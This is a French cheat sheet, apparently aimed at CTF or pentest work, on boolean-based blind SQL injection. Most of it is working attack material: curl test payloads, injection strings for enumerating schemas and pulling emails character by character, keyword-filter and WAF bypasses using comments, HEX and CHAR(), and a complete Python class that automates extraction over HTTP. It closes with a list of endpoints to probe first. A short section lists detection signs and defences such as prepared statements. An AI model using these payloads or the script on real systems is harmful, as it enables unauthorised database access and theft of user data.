## 📋 Définition

L'injection SQL **Boolean-based Blind** est une technique d'exploitation qui permet d'extraire des données d'une base de données en analysant les **réponses binaires** (vrai/faux) de l'application, sans voir directement les données.

## 🔍 Identification

### Signes caractéristiques :

- Application retourne **des réponses différentes** selon la véracité de la condition SQL
- Pas d'affichage direct des données de la DB
- Réponses binaires : `true/false`, `success/error`, `200/404`, etc.

### Test de base :

```bash
# Test condition vraie
curl "http://target/api/endpoint/test' OR 1=1 OR 'x'='y"
# Résultat attendu : "true" ou réponse positive

# Test condition fausse  
curl "http://target/api/endpoint/test' OR 1=2 OR 'x'='y"
# Résultat attendu : "false" ou réponse négative
```

## 🛠️ Techniques d'exploitation

### 1. Énumération des structures

```sql
-- Compter les bases de données
' OR (SELECT COUNT(*) FROM information_schema.schemata) = X OR 'x'='y

-- Compter les tables dans une DB
' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='db_name') = X OR 'x'='y

-- Compter les lignes dans une table
' OR (SELECT COUNT(*) FROM table_name) = X OR 'x'='y
```

### 2. Extraction caractère par caractère

#### Méthode SUBSTR + ASCII (classique)

```sql
-- Test du premier caractère d'un email
' OR ASCII(SUBSTR((SELECT email FROM users LIMIT 1), 1, 1)) = 97 OR 'x'='y
-- 97 = 'a' en ASCII
```

#### Méthode LIKE (plus robuste)

```sql
-- Construction progressive avec LIKE
' OR (SELECT email FROM users LIMIT 1) LIKE 'a%' OR 'x'='y
' OR (SELECT email FROM users LIMIT 1) LIKE 'ad%' OR 'x'='y
' OR (SELECT email FROM users LIMIT 1) LIKE 'adm%' OR 'x'='y
```

#### Méthode conversion numérique (contournement)

```sql
-- Conversion en numérique pour éviter les filtres
' OR (SUBSTR((SELECT email FROM users LIMIT 1), 1, 1) + 0) = 97 OR 'x'='y
```

### 3. Navigation dans les résultats

```sql
-- Première ligne
SELECT column FROM table LIMIT 1

-- Deuxième ligne
SELECT column FROM table LIMIT 1 OFFSET 1

-- Alternative MySQL
SELECT column FROM table LIMIT 1,1
```

### 4. Binary Search (optimisation)

```python
def extract_char_binary_search(position):
    low, high = 32, 126  # ASCII printable
    
    while low <= high:
        mid = (low + high) // 2
        condition = f"ASCII(SUBSTR(column, {position}, 1)) >= {mid}"
        
        if test_sql_condition(condition):
            low = mid + 1
        else:
            high = mid - 1
    
    return chr(high) if high >= 32 else None
```

## 🚧 Contournements courants

### Restrictions sur information_schema

```sql
-- Si information_schema est bloqué, bruteforce direct
' OR (SELECT username FROM users LIMIT 1) IS NOT NULL OR 'x'='y

-- Test de colonnes courantes
columns = ['id', 'username', 'email', 'password', 'admin', 'role']
for col in columns:
    test: f"(SELECT {col} FROM table LIMIT 1) IS NOT NULL"
```

### Filtrage de mots-clés

```sql
-- Contournement avec encoding
SELECT -> SELE/**/CT
UNION -> UNI/**/ON
OR -> ||

-- Contournement avec CASE
SELECT CASE WHEN condition THEN 1 ELSE 0 END
```

### Filtrage de caractères spéciaux

```sql
-- Utilisation de HEX
' OR (SELECT column FROM table) = 0x61646d696e OR 'x'='y
-- 0x61646d696e = 'admin' en hex

-- Utilisation de CHAR()
' OR (SELECT column FROM table) = CHAR(97,100,109,105,110) OR 'x'='y
-- CHAR(97,100,109,105,110) = 'admin'
```

## 🔧 Script d'exploitation type

```python
import requests
import urllib.parse

class BlindSQLInjection:
    def __init__(self, url, injection_point):
        self.url = url
        self.injection_point = injection_point
    
    def test_condition(self, condition):
        payload = f"{self.injection_point}' OR ({condition}) OR 'x'='y"
        encoded = urllib.parse.quote(payload, safe='')
        
        response = requests.get(f"{self.url}/{encoded}")
        return "true" in response.text.lower()  # Adapter selon l'app
    
    def extract_string_like(self, sql_query):
        result = ""
        charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@.-_'
        
        for pos in range(1, 100):
            found = False
            for char in charset:
                pattern = result + char + '%'
                condition = f"({sql_query}) LIKE '{pattern}'"
                
                if self.test_condition(condition):
                    result += char
                    print(f"Position {pos}: {result}")
                    found = True
                    break
            
            if not found:
                break
        
        return result
```

## 📊 Cas d'usage typiques

### Applications vulnérables :

- **APIs de validation** (ex: `/api/user/validate/{username}`)
- **Systèmes de recherche** avec filtres SQL
- **Applications de login** avec réponses différentiées
- **Endpoints de vérification** (exists/not exists)

### Technologies concernées :

- **MySQL, PostgreSQL, SQL Server, Oracle**
- **Applications PHP, Python, Node.js, .NET**
- **APIs REST/GraphQL** avec paramètres SQL

## ⚠️ Limitations et détection

### Limitations :

- **Très lent** : 1 caractère = plusieurs requêtes
- **Bruyant** : génère beaucoup de logs
- **Dépendant du timing** réseau
- **Peut être détecté** par les WAF

### Signes de détection :

```bash
# Dans les logs web
- Multiples requêtes avec OR conditions
- Patterns répétitifs avec SUBSTR/ASCII
- Requêtes avec LIKE patterns progressifs
- Volume élevé de requêtes similaires
```

### Protection :

- **Requêtes préparées** (parameterized queries)
- **Validation stricte** des entrées
- **WAF** avec détection de patterns SQL
- **Rate limiting** sur les endpoints sensibles
- **Principe du moindre privilège** pour les comptes DB

### Charset optimisé :

```python
# Charset CTF typique
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@.-_{}:'
```

### Endpoints à tester en priorité :

- `/api/user/validate/`
- `/api/auth/check/`
- `/search?q=`
- `/api/exists/`
- Tout endpoint avec réponse `true/false`